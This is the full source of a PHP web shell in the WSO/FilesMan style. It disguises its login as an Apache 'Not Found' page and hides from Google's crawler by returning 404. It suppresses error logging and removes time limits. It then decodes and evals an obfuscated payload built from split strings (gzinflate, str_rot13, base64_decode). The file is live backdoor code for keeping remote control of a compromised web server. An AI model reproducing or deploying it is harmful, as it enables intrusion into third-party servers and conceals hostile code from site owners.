<?
$auth_pass = "9c80a1eaca699e2fc6b994721f8703bc";
$color = "#00ff00";
$default_action = 'FilesMan';
@define('SELF_PATH', __FILE__);
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
    header('HTTP/1.0 404 Not Found');
    exit;
}
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION', '2.1');
if( get_magic_quotes_gpc() ) {
    function stripslashes_array($array) {
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
    }
    $_POST = stripslashes_array($_POST);
}
function printLogin() {
    ?>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address>
    <style>
        input { margin:0;background-color:#fff;border:1px solid #fff; }
    </style>
    <center>
    <form method=post>
    <input type=password name=pass>
    </form></center>
    <?php
    exit;
}
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
    if( empty( $auth_pass ) ||
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        printLogin();
function x($inject){eval("\$z=gz" . "inf" . "la" . "te(s" . "t" . "r_r" . "ot" . "13(ba" . "se" . "6" . "4" . "_" . "d" . "e" . "c" . "o" . "de(st" . "r" . "_" . "r" . "o" . "t" . "13(" . "gzi" . "nf" . "lat" . "e(" . "bas" . "e6" . "4_d" . "ec" . "ode(\$inject))))));eval(\$z);");}
x("BcFLEkMwAADQA3UR41PtoosYVDCToE3ETklHQv1L3b7v+dTA5E1Vmj3lKq8JUnbFArMm3x6w0SsfmthiFIfpAOZJea99h9vY3n25Av/JpM4TuogsP7sYt/kWd63yMUoIFnpJcBE6OyxpNFWNDAIewUZ+Mupm1pqiuGI9P4aC71blFMl0TLOLF8YFtIbI6HB4DNA2wSKVPGnsAkRdm+7v9gc=");
?>
